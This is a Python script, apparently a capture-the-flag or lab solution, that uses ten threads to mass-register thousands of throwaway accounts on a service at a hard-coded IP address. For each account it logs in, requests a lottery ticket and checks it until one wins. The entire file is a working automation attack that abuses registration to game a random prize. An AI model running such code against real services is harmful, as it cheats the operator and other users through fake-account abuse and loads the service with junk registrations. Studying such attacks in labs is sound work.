import requests
from concurrent.futures import ThreadPoolExecutor
import threading

url_base = 'http://94.19.79.169:20001/api'
found_lock = threading.Lock()
winner_found = False


def try_account(attempt):
    global winner_found

    if winner_found:
        return None

    username = f'dmitriy.{attempt}'
    password = '%pass1234%'

    try:
        # Регистрация
        requests.post(f'{url_base}/auth/register',
                      json={'username': username, 'password': password},
                      timeout=5)

        # Логин
        response = requests.post(f'{url_base}/auth/login',
                                 json={'username': username, 'password': password},
                                 timeout=5)

        cookies = response.cookies

        # Получаем и проверяем билет
        requests.post(f'{url_base}/ticket/get', cookies=cookies, timeout=5)

        response = requests.post(f'{url_base}/ticket/check', cookies=cookies, timeout=5)
        result = response.json()
        message = result.get('message', '')

        print(f'[{attempt}] {username}: {message}')

        if 'проиграл' not in message.lower():
            with found_lock:
                winner_found = True  # Убрал лишний global
                print(f'\n[+] WINNER: {username}')
                print(f'[+] {message}')
                return message

    except Exception as e:
        print(f'[{attempt}] Error: {e}')

    return None


print("[*] Starting multi-threaded brute-force...")

with ThreadPoolExecutor(max_workers=10) as executor:
    for i in range(1, 10000):
        if winner_found:
            break
        executor.submit(try_account, i)

print("\n[*] Done!")